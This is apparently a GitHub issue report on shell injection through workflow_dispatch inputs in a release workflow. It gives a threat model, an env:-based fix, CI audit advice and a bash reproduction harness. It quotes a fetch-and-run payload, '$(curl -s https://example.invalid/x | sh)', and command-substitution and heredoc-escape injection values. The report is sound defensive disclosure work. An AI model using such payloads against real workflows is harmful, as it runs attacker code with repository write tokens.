
### Summary

`release.yml` builds shell command lines by textual substitution of `${{ … inputs.* }}`:

- `release.yml:429-436`, job `changeset-pr` (`Create Changeset PR`), `contents: write` + `pull-requests: write` — this is the live one, because it reads `description`:

  ```yaml
  run: |
    DESCRIPTION="${{ inputs.description }}"
    if [ -z "$DESCRIPTION" ]; then
      DESCRIPTION="Manual release"
    fi
    bun scripts/create-manual-changeset.mjs \
      --bump-type "${{ inputs.bump_type }}" \
      --description "$DESCRIPTION"
  ```

  The `DESCRIPTION="…"` assignment is the whole problem: the value is inside the double quotes of a shell assignment the runner has already written, so `$( )` in it is a command substitution.

- `release.yml:382`, job `manual-release-instant` (`Manual Release (Instant)`), `contents: write`:

  ```yaml
  run: bun scripts/version-and-commit.mjs --mode instant --bump-type ${{ inputs.bump_type }}
  ```

  Only the validated `choice` reaches this one, and the expansion is unquoted. Defence in depth rather than a live hole, and the same fix.

`${{ }}` is expanded by the runner **before** the shell parses the line, so the value is not an argument — it is script text. A `description` of

```
$(curl -s https://example.invalid/x | sh)
```

is a command substitution the shell then runs, in a job that holds a `contents: write` token.

Which input reaches a site decides how live it is. `description` is declared `type: string`, which GitHub constrains in no way. `bump_type` is a `choice`, and GitHub does validate a choice against its `options` — the API answers `422 Provided value 'definitely-not-an-option' for input 'release_mode' not in the list of allowed values` and creates no run, which we measured against our own `release.yml`. So a site fed by `description` is live, and a site fed only by `bump_type` is defence in depth. Both are the same one-line fix.

### Threat model, stated plainly

Dispatching a workflow requires write access, so this is not an anonymous-attacker bug. What it does is turn "may trigger a release" into "may run arbitrary code in a job holding `contents: write` and a `GITHUB_TOKEN`" — for a human with write access, for a bot or app with `actions: write`, and for any token that leaks. It also means the release path cannot be reviewed as data-only, which is the property a release workflow most wants to have.

This is [zizmor](https://docs.zizmor.sh/audits/#template-injection)'s `template-injection` audit, and running zizmor over `.github/` reports these sites.

### Reproduction

The expansion is what matters, so the fixture performs it exactly as the runner does: substitute the input's text into the **whole** `run:` block, dedented as YAML dedents it, and hand that to `bash`, with stub tools on `PATH` so nothing real runs and a payload that proves execution by writing a file rather than by fetching anything. `experiments/issue-123/repro-dispatch-description-injection.sh` (attached below) does that for every `run:` block of `release.yml` that interpolates a dispatch input, with two payloads:

- `cmdsub` — `$(printf INJECTED >> "$proof")`, which reaches an interpolation sitting where the shell performs expansion;
- `heredoc` — a newline, a line reading `EOF`, then the same `$( )`, which is what it takes to escape a **quoted** heredoc (`cat > f << 'EOF'`), inside which the shell expands nothing.

Substituting into whole blocks rather than into single lines is deliberate, and it corrected a false positive in our own first pass: a line lifted out of a quoted heredoc looks like an ordinary command line and reports as injectable when it is not.

Measured against `java` at `450a10ec1f22a7c1c99e4828ad83cfde3b9a0311`:

```
### java @ 450a10ec -- layer 1, the workflow expansion
  REPRODUCED  java release.yml:382 (interpolated at 382) (cmdsub)
  REPRODUCED  java release.yml:429 (interpolated at 430,435) (cmdsub)
  REPRODUCED  java release.yml:382 (interpolated at 382) (heredoc)
  REPRODUCED  java release.yml:429 (interpolated at 430,435) (heredoc)
```

Every `REPRODUCED` line is a site where the payload executed inside the step's shell.

### Workaround

Nothing at the repository level: an operator can only avoid typing a description. Until the fix lands, treat the dispatch form as privileged.

### Suggested fix

Pass the value through the environment, and let the shell read it as data. An `env:` value is placed in the process environment, not into the script text, so the shell expands it after parsing:

```diff
       - name: Create changeset file
+        env:
+          BUMP_TYPE: ${{ inputs.bump_type }}
+          DESCRIPTION_INPUT: ${{ inputs.description }}
         run: |
-          DESCRIPTION="${{ inputs.description }}"
+          DESCRIPTION="$DESCRIPTION_INPUT"
           if [ -z "$DESCRIPTION" ]; then
             DESCRIPTION="Manual release"
           fi
           bun scripts/create-manual-changeset.mjs \
-            --bump-type "${{ inputs.bump_type }}" \
+            --bump-type "$BUMP_TYPE" \
             --description "$DESCRIPTION"

       - name: Run version and commit script
         id: release
-        run: bun scripts/version-and-commit.mjs --mode instant --bump-type ${{ inputs.bump_type }}
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          BUMP_TYPE: ${{ inputs.bump_type }}
+        run: bun scripts/version-and-commit.mjs --mode instant --bump-type "$BUMP_TYPE"
```

Four things worth doing at the same time:

- **Quote the expansion.** `--bump-type $BUMP_TYPE` unquoted still splits on whitespace and globs; it is no longer *execution*, but it is still not the value.
- **Do the same for every site**, including the ones whose input is a `choice`. A `choice` is validated today; the validation is not part of this workflow's own contract, and a later edit that turns the input into a `string` reintroduces the hole silently.
- **Add the audit to CI**, so the next site is caught when it is written:

  ```yaml
  - name: Audit workflows
    uses: zizmorcore/zizmor-action@<pinned-sha>
    with:
      advanced-security: false
      persona: regular
  ```

  We run zizmor over `.github/` — workflows *and* composite actions, which is worth pointing out: scanning only `.github/workflows` leaves `action.yml` files unread by any linter, and that is where we found our own `template-injection`.

- **Or assert the policy offline.** The `csharp` template already ships one: `scripts/workflow-injection-policy.test.mjs` walks every `run:` block of every workflow and fails on any expression matching its `UNTRUSTED_CONTEXTS` list. Porting it costs no network and no action, and it is worth adding two patterns the shipped list does not have — `/github\.event\.inputs\.\w+/` and `/\binputs\.\w+/` — which are exactly the sites above.

### One note on the transcript

`release.yml:429` reproduces under both payloads and `release.yml:382` under both as well, but for different reasons: the first is a live shell assignment fed by an unvalidated `string`, the second is an unquoted expansion fed by a validated `choice`. The fixture substitutes the payload wherever the expression appears; GitHub is what stops the second one today.

### Relation to earlier work

Found while auditing every CI/CD false positive and false negative in `link-foundation/box` ([box#123](https://github.com/link-foundation/box/issues/123)), which compares this template's full workflow and script tree against ours, file by file.

The `rust` template already does the right thing and is worth copying verbatim — `release.yml:1163-1167` reads both inputs through `env:` and the script line references `"$BUMP_TYPE"` and `"$DESCRIPTION"`. The js, python and php templates interpolate no dispatch input into any `run:` script at all.

Reported in the `go` and `java` templates, which are the two that interpolate a dispatch input into a `run:` script and have no open report for it. The `rust` template had the same defect and fixed it in [rust#111](https://github.com/link-foundation/rust-ai-driven-development-pipeline-template/issues/111); in the `csharp` template it is already open as [csharp#53](https://github.com/link-foundation/csharp-ai-driven-development-pipeline-template/issues/53), to which we added the measured transcript rather than filing again.

### The fixtures, so this is runnable without cloning `box`

<details>
<summary><code>experiments/issue-123/repro-dispatch-description-injection.sh</code></summary>

```bash
#!/usr/bin/env bash
# Reproduce: a workflow_dispatch input is pasted straight into a `run:` body,
# and (in the C# template) from there into a shell command built by string
# concatenation that escapes only the double quote.
#
# GitHub expands `${{ ... }}` by textual substitution *before* the shell parses
# the line, so an input containing `$(...)`, a backtick or a newline is not an
# argument -- it is code. The same input read through `env:` is inert, because
# the shell expands a variable after parsing it.
#
# Three layers are reproduced:
#   layer 1  the workflow expansion, by substituting a payload into the real
#            `run:` block exactly as the runner would -- the *whole* block,
#            dedented as YAML dedents it, with stub tools on PATH so nothing
#            real runs. Two payloads are tried per block:
#              cmdsub    `$(...)`, which needs the interpolation to sit where
#                        the shell performs expansion;
#              heredoc   a newline, a line reading `EOF`, and then `$(...)`,
#                        which is what it takes to escape a *quoted* heredoc
#                        (`<< 'EOF'`), where the shell expands nothing. The API
#                        accepts newlines in a `type: string` dispatch input.
#   layer 2  the C# script's own escaping, by calling the same
#            execSync(`git commit -m "${msg.replace(/"/g, '\"')}"`) shape from
#            scripts/version-and-commit.mjs:412 with a stub `git`.
#
# Why the whole block and not the interpolated line: an earlier version of this
# script substituted into single lines and ran each one on its own. That reports
# a quoted heredoc as injectable, because the line taken out of its heredoc is
# an ordinary command line -- a false positive of exactly the kind this audit is
# about. Running the block keeps the context that decides the answer.
#
# Usage:
#   bash experiments/issue-123/repro-dispatch-description-injection.sh TEMPLATE_DIR...
# where each TEMPLATE_DIR is a checkout of one of the
# link-foundation/*-ai-driven-development-pipeline-template repositories.
set -uo pipefail

work="$(mktemp -d)"
trap 'rm -rf "${work}"' EXIT
mkdir -p "${work}/bin" "${work}/blocks"

# Stubs: the payload must be the only thing that can write the proof file.
for tool in bun npm node git gh mvn dotnet go cargo rust-script; do
  printf '#!/bin/sh\nexit 0\n' >"${work}/bin/${tool}"
  chmod +x "${work}/bin/${tool}"
done

proof="${work}/proof"
reproduced=0
checked=0
blocked=0

# Extract every `run:` block of a workflow, dedented, one file per block, and
# print `startline<TAB>path<TAB>interpolated-lines` for the blocks that
# interpolate a dispatch input. The payload is substituted here, so the file is
# exactly what the shell would receive.
emit_blocks() {
  WF="$1" OUT="$2" PAYLOAD="$3" python3 - <<'PY'
import os
import re

wf = os.environ["WF"]
out = os.environ["OUT"]
payload = os.environ["PAYLOAD"]

INPUT_RE = re.compile(r"\$\{\{[^}]*inputs\.(?:description|bump_type)[^}]*\}\}")
OTHER_RE = re.compile(r"\$\{\{[^}]*\}\}")

lines = open(wf, encoding="utf-8").read().split("\n")


def indent_of(line):
    stripped = line.lstrip(" ")
    return len(line) - len(stripped)


blocks = []  # (startline, [(lineno, text)])
i = 0
while i < len(lines):
    line = lines[i]
    # Block scalar: `run: |`, `run: >-`, ...
    if re.match(r"^[ ]*-?[ ]*run:[ ]*[|>][-+]?[ ]*$", line):
        keyindent = indent_of(line)
        body = []
        j = i + 1
        while j < len(lines):
            if lines[j].strip() == "":
                body.append((j + 1, ""))
                j += 1
                continue
            if indent_of(lines[j]) <= keyindent:
                break
            body.append((j + 1, lines[j]))
            j += 1
        # YAML strips the block's common indentation.
        widths = [indent_of(t) for _, t in body if t.strip()]
        strip = min(widths) if widths else 0
        blocks.append((i + 1, [(n, t[strip:] if t.strip() else "") for n, t in body]))
        i = j
        continue
    # Inline form: `run: <command>`
    m = re.match(r"^([ ]*-?[ ]*run:[ ]+)([^|>].*)$", line)
    if m:
        blocks.append((i + 1, [(i + 1, m.group(2))]))
    i += 1

records = []
for start, body in blocks:
    hits = [n for n, t in body if INPUT_RE.search(t)]
    if not hits:
        continue
    text = "\n".join(t for _, t in body) + "\n"
    text = INPUT_RE.sub(lambda _: payload, text)
    # Every other expression is substituted with a benign literal, which is also
    # what the runner does before the shell sees the line. `.` keeps the paths
    # these blocks build valid.
    text = OTHER_RE.sub(".", text)
    path = os.path.join(out, "block-%d.sh" % start)
    with open(path, "w", encoding="utf-8") as handle:
        handle.write(text)
    records.append("%d\t%s\t%s" % (start, path, ",".join(str(n) for n in hits)))

print("\n".join(records))
PY
}

try_block() {
  local label="$1" script="$2" kind="$3"
  : >"${proof}"
  (cd "${work}" && PATH="${work}/bin:${PATH}" bash "${script}") >/dev/null 2>&1
  if [ -s "${proof}" ]; then
    echo "  REPRODUCED  ${label} (${kind})"
    reproduced=$((reproduced + 1))
    return 0
  fi
  return 1
}

for dir in "$@"; do
  name="$(basename "${dir}")"
  wf="${dir}/.github/workflows/release.yml"
  [ -f "${wf}" ] || continue
  echo "### ${name} @ $(cd "${dir}" && git rev-parse --short=8 HEAD) -- layer 1, the workflow expansion"
  found=0
  for kind in cmdsub heredoc; do
    case "${kind}" in
      cmdsub) payload='$(printf INJECTED >> '"${proof}"')' ;;
      heredoc) payload="$(printf '\nEOF\n$(printf INJECTED >> %s)\n' "${proof}")" ;;
    esac
    out="${work}/blocks/${name}-${kind}"
    mkdir -p "${out}"
    while IFS=$'\t' read -r start script hits; do
      [ -n "${start:-}" ] || continue
      found=1
      [ "${kind}" = cmdsub ] && checked=$((checked + 1))
      try_block "${name} release.yml:${start} (interpolated at ${hits})" "${script}" "${kind}" \
        || {
          [ "${kind}" = heredoc ] && continue
          echo "  inert       ${name} release.yml:${start} (interpolated at ${hits}) (cmdsub)"
          blocked=$((blocked + 1))
        }
    done < <(emit_blocks "${wf}" "${out}" "${payload}")
  done
  [ "${found}" = 1 ] || echo "  (no dispatch input interpolated into a run: script)"
  echo
done

# ---------------------------------------------------------------------- layer 2
# The C# template's own escaping, driven through the real script rather than a
# re-implementation of it: scripts/version-and-commit.mjs builds
#   exec(`git commit -m "${commitMsg.replace(/"/g, '\\"')}"`)
# at :412 and the same shape for `git tag -a` at :419. Only the double quote is
# escaped, so `$( )` in the description is executed by the shell execSync starts.
# Fixing the workflow (env: + "$DESCRIPTION") does NOT fix this: the value still
# arrives on argv and is still concatenated into a command string.
csharp_dir=""
for dir in "$@"; do
  [ "$(basename "${dir}")" = csharp ] && csharp_dir="${dir}"
done

if [ -n "${csharp_dir}" ]; then
  echo "### layer 2: the C# template's own exec() escaping, driven through the real script"
  checked=$((checked + 1))
  : >"${proof}"
  fixture="${work}/csharp-exec"
  cp -r "${csharp_dir}" "${fixture}"
  # Enough git for the script to reach its commit step, and a record of what it
  # was asked to run. `git diff --cached --quiet` must report changes (exit 1)
  # and `git rev-parse --verify` must report the tag as absent.
  # A separate bin dir: layer 1's stubs include `node`, and layer 2 needs the
  # real one -- the point is to run the shipped script, not a stub of it.
  mkdir -p "${work}/bin-layer2"
  cat >"${work}/bin-layer2/git" <<'STUB'
#!/bin/sh
case "$*" in
  *"diff --cached --quiet"*) exit 1 ;;
  *"rev-parse --verify"*) exit 1 ;;
esac
printf 'git %s\n' "$*" >> "${GIT_STUB_LOG}"
exit 0
STUB
  chmod +x "${work}/bin-layer2/git"
  : >"${work}/git-stub.log"
  (cd "${fixture}" && PATH="${work}/bin-layer2:${PATH}" GIT_STUB_LOG="${work}/git-stub.log" \
    node scripts/version-and-commit.mjs --mode instant --bump-type patch \
    --description '$(printf INJECTED >> '"${proof}"')') >"${work}/csharp-exec.out" 2>&1
  echo "  script exit=$?"
  if [ -s "${proof}" ]; then
    echo "  REPRODUCED  a --description of \$(...) executed $(wc -c <"${proof}" | tr -d ' ') byte(s) worth of payload"
    echo "              (twice: once for the commit message at :412, once for the tag message at :419)"
    reproduced=$((reproduced + 1))
  else
    echo "  inert       the description did not execute"
  fi
  echo "  what the stub git was asked to run:"
  sed 's/^/    /' "${work}/git-stub.log"
fi

echo
echo "reproduced ${reproduced} payload(s) over ${checked} interpolating run: block(s); ${blocked} block(s) resisted the cmdsub payload"
[ "${reproduced}" -gt 0 ] || exit 1
```

</details>

